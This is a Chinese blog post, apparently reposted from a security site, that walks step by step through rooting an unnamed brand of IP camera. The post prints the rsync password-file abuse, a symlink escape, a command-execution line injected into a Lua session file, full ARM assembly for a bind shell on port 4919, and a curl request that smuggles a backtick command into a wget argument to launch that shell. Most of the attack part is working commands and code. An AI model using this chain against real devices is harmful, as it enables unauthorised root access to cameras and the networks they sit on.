> 原文链接: https://www.anquanke.com//post/id/84845 


# 【技术分享】看我如何一步步PWN掉国内某摄像头


                                阅读量   
                                **111799**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t0148a1d759904702ba.jpg)](https://p3.ssl.qhimg.com/t0148a1d759904702ba.jpg)

闲来无事，买了一个某品牌的摄像头来 pwn 着玩（到货第二天就忙成狗了，flag 真是立的飞起）。

本想挖一挖二进制方面的漏洞，但是死性不改的看了下 Web，通过一个完整的攻击链获取到这款摄像头的 root 权限，感觉还是很有意思的。

<br>

**0x00**

配置好摄像头连上内网后，首先习惯性的用 nmap 扫描了一下端口。



```
&gt;&gt;&gt; ~ nmap 192.168.1.101 -n -v --open
Starting Nmap 7.12 ( https://nmap.org ) at 2016-11-01 12:13 CST
Initiating Ping Scan at 12:13
Scanning 192.168.1.101 [2 ports]
Completed Ping Scan at 12:13, 0.01s elapsed (1 total hosts)
Initiating Connect Scan at 12:13
Scanning 192.168.1.101 [1000 ports]
Discovered open port 80/tcp on 192.168.1.101
Discovered open port 554/tcp on 192.168.1.101
Discovered open port 873/tcp on 192.168.1.101
Discovered open port 52869/tcp on 192.168.1.101
Completed Connect Scan at 12:13, 0.35s elapsed (1000 total ports)
Nmap scan report for 192.168.1.101
Host is up (0.051s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
80/tcp    open  http
554/tcp   open  rtsp
873/tcp   open  rsync
52869/tcp open  unknown
Read data files from: /usr/local/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
```

除了 554、80，居然发现了一个 873 端口。873 是 rsync 的端口，一个摄像头居然开启了这个端口，感觉到十分的费解。

查看了下 rsync 的目录，发现有密码，暂时搁置。



```
&gt;&gt;&gt; ~ rsync 192.168.1.101::                                                                             12:22:03
usb             rsync_mgr
nas             rsync_mgr
&gt;&gt;&gt; ~ rsync 192.168.1.101::nas                                                                          12:22:06
Password:
@ERROR: auth failed on module nas
rsync error: error starting client-server protocol (code 5) at /BuildRoot/Library/Caches/com.apple.xbs/Sources/rsync/rsync-51/rsync/main.c(1402) [receiver=2.6.9]
```

Web 端黑盒没有分析出漏洞，同样暂时搁置。

不过暂时发现有意思的一点，这个摄像头可以挂载 NFS。

[![](https://p1.ssl.qhimg.com/t0109b2993596e4e162.jpg)](https://p1.ssl.qhimg.com/t0109b2993596e4e162.jpg)

<br>

**0x01**

下面着手分析固件。

在官网下载固件后，用 firmware-mod-kit 解包。

[![](https://p4.ssl.qhimg.com/t01e28f21ae92cdee3f.jpg)](https://p4.ssl.qhimg.com/t01e28f21ae92cdee3f.jpg)

/home/httpd 存放着 Web 所有的文件，是 lua 字节码。file 一下发现是 lua-5.1 版本的。

利用 unluac.jar 解码得到 Web 源码。

本以为会有命令执行等漏洞，因为会有 NFS 挂载的过程。但是并没有找到所谓的漏洞存在。

同时看了下 rsync 配置文件，发现密码为 ILove****：

[![](https://p4.ssl.qhimg.com/t01737468609705a1a0.jpg)](https://p4.ssl.qhimg.com/t01737468609705a1a0.jpg)

但是尝试查看内容的时候提示 chdir faild，难道说这个文件不存在？



```
&gt;&gt;&gt; ~/D/httpd rsync rsync@192.168.1.101::nas --password-file /tmp/p
@ERROR: chdir failed
rsync error: error starting client-server protocol (code 5) at /BuildRoot/Library/Caches/com.apple.xbs/Sources/rsync/rsync-51/rsync/main.c(1402) [receiver=2.6.9]
```

突然有个猜想划过脑海。于是我搭建了一个 NFS 服务器，然后配置好摄像头 NFS：

[![](https://p5.ssl.qhimg.com/t019c9a7c6d3f766167.jpg)](https://p5.ssl.qhimg.com/t019c9a7c6d3f766167.jpg)

再次运行 rsync：



```
&gt;&gt;&gt; ~/D/httpd rsync rsync@192.168.1.101::nas --password-file /tmp/p
drwxrwxrwx        4096 2016/11/01 12:35:47 .
drwxr-xr-x        4096 2016/11/01 12:35:47 HN1A009G9M12857
```

Bingo！

<br>

**0x02**

rsync 目录限制在 /mnt/netsrv/nas 了，如何绕过呢。

symbolic link 来帮你_(:3」∠)_ 

愚蠢的 rsync 并没有设置 chroot，于是我可以直接创建一个指向 / 的符号链接，然后可以访问任意目录。

[![](https://p5.ssl.qhimg.com/t01ea82d736a7268ab4.jpg)](https://p5.ssl.qhimg.com/t01ea82d736a7268ab4.jpg)



```
&gt;&gt;&gt; ~/D/httpd rsync --password-file /tmp/p rsync@192.168.1.101::nas/HN1A009G9M12857/pwn/
drwxr-xr-x         216 2016/07/23 11:28:55 .
lrwxrwxrwx          11 2016/07/23 11:28:43 linuxrc
lrwxrwxrwx           9 2016/07/23 11:28:55 tmp
drwxr-xr-x         971 2016/07/23 11:28:56 bin
drwxrwxrwt       10620 1970/01/01 08:00:10 dev
drwxr-xr-x         603 2016/07/23 11:28:55 etc
drwxr-xr-x          28 2016/07/23 11:28:43 home
drwxr-xr-x        1066 2016/07/23 11:28:56 lib
drwxr-xr-x          60 2016/07/23 11:27:31 mnt
dr-xr-xr-x           0 1970/01/01 08:00:00 proc
drwxr-xr-x         212 2016/07/23 11:28:56 product
drwxr-xr-x           3 2016/07/23 11:27:31 root
drwxr-xr-x         250 2016/07/23 11:28:43 sbin
drwxr-xr-x           0 1970/01/01 08:00:01 sys
drwxr-xr-x          38 2016/07/23 11:27:31 usr
drwxr-xr-x          50 2016/07/23 11:28:55 var
```

正当我愉快的打算 rsync 一个 lua 的 shell 到上面时，却发现除了 /tmp/，整个文件系统都不可写。

嘛，没关系，我们还有 Web 源码可以看。



```
local initsession = function()
  local sess_id = cgilua.remote_addr
  if sess_id == nil or sess_id == "" then
    g_logger:warn("sess_id error")
    return
  end
  g_logger:debug("sess_id = " .. sess_id)
  setsessiondir(_G.CGILUA_TMP)
  local timeout = 300
  local t = cmapi.getinst("OBJ_USERIF_ID", "")
  if t.IF_ERRORID == 0 then
    timeout = tonumber(t.Timeout) * 60
  end
  setsessiontimeout(timeout)
  session_init(sess_id)
  return sess_id
end
```

initsession 函数创建了一个文件名为 IP 地址的 session，文件储存在 /tmp/lua_session



```
&gt;&gt;&gt; ~/D/httpd rsync --password-file /tmp/p rsync@192.168.1.101::nas/HN1A009G9M12857/pwn/tmp/lua_session/
drwxrwxr-x          60 2016/11/01 12:11:12 .
-rw-r--r--         365 2016/11/01 12:35:55 192_168_1_100.lua
```

同步回来，加一句 os.execute(cgilua.POST.cmd);，然后同步回去。

[![](https://p3.ssl.qhimg.com/t0157927792f10574a4.jpg)](https://p3.ssl.qhimg.com/t0157927792f10574a4.jpg)

看起来已经成功执行了命令。但是我尝试了常见的 whoami、id 等命令，发现并不存在，通过 sh 反弹 shell 也失败了。感觉很尴尬233333

<br>

**0x03**

通过收集部分信息得知摄像头为 ARM 架构，编写一个 ARM 的 bind shell 的 exp：



```
void main()
`{`
    asm(
    "mov %r0, $2n"
    "mov %r1, $1n"
    "mov %r2, $6n"
    "push `{`%r0, %r1, %r2`}`n"
    "mov %r0, $1n"
    "mov %r1, %spn"
    "svc 0x00900066n"
    "add %sp, %sp, $12n"
    "mov %r6, %r0n"
    ".if 0n"
    "mov %r0, %r6n"
    ".endifn"
    "mov %r1, $0x37n"
    "mov %r7, $0x13n"
    "mov %r1, %r1, lsl $24n"
    "add %r1, %r7, lsl $16n"
    "add %r1, $2n"
    "sub %r2, %r2, %r2n"
    "push `{`%r1, %r2`}`n"
    "mov %r1, %spn"
    "mov %r2, $16n"
    "push `{`%r0, %r1, %r2`}`n"
    "mov %r0, $2n"
    "mov %r1, %spn"
    "svc 0x00900066n"
    "add %sp, %sp, $20n"
    "mov %r1, $1n"
    "mov %r0, %r6n"
    "push `{`%r0, %r1`}`n"
    "mov %r0, $4n"
    "mov %r1, %spn"
    "svc 0x00900066n"
    "add %sp, $8n"
    "mov %r0, %r6n"
    "sub %r1, %r1, %r1n"
    "sub %r2, %r2, %r2n"
    "push `{`%r0, %r1, %r2`}`n"
    "mov %r0, $5n"
    "mov %r1, %spn"
    "svc 0x00900066n"
    "add %sp, %sp, $12n"
    "mov %r6, %r0n"
    "mov %r1, $2n"
    "1:  mov %r0, %r6n"
    "svc 0x0090003fn"
    "subs %r1, %r1, $1n"
    "bpl 1bn"
    "sub %r1, %sp, $4n"
    "sub %r2, %r2, %r2n"
    "mov %r3, $0x2fn"
    "mov %r7, $0x62n"
    "add %r3, %r7, lsl $8n"
    "mov %r7, $0x69n"
    "add %r3, %r7, lsl $16n"
    "mov %r7, $0x6en"
    "add %r3, %r7, lsl $24n"
    "mov %r4, $0x2fn"
    "mov %r7, $0x73n"
    "add %r4, %r7, lsl $8n"
    "mov %r7, $0x68n"
    "add %r4, %r7, lsl $16n"
    "mov %r5, $0x73n"
    "mov %r7, $0x68n"
    "add %r5, %r7, lsl $8n"
    "push `{`%r1, %r2, %r3, %r4, %r5`}`n"
    "add %r0, %sp, $8n"
    "add %r1, %sp, $0n"
    "add %r2, %sp, $4n"
    "svc 0x0090000bn"
    );
`}`
```

编译：

```
arm-linux-gcc 2.c -o 2 -static
```

通过 rsync 扔到 /tmp 目录，然后跑起来：



```
rsync --password-file /tmp/p 2 rsync@192.168.1.101::nas/HN1A009G9M12857/pwn/tmp/
curl http://192.168.1.101 --data "cmd=wget%20192.168.1.100:2333/`/tmp/2%26`"
```

连接 4919 端口：

[![](https://p3.ssl.qhimg.com/t01af3334d07f974788.jpg)](https://p3.ssl.qhimg.com/t01af3334d07f974788.jpg)

Pwned！破解成功！

[![](https://p3.ssl.qhimg.com/t01f61186d5d54202e2.jpg)](https://p3.ssl.qhimg.com/t01f61186d5d54202e2.jpg)[![](https://p0.ssl.qhimg.com/t01cc5d036b04c82003.jpg)](https://p0.ssl.qhimg.com/t01cc5d036b04c82003.jpg)
